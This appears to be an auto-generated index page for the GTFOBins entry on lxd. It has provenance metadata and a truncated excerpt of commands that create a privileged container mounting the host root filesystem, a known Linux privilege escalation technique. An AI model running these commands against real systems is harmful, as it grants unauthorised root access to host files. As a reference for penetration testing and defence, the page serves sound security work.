---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# lxd

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `lxd` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lxd` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for lxd covering shell.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/lxd.md)
- Source verification: [source record](../../sources/gtfobins/lxd.md)

## Aliases

- `lxd`

## Source Verification

[source record](../../sources/gtfobins/lxd.md)

## Evidence Excerpt

```text
_body: ''
_name: lxd
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lxd
functions:
shell:
- code: 'lxc init ubuntu:16.04 x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
```
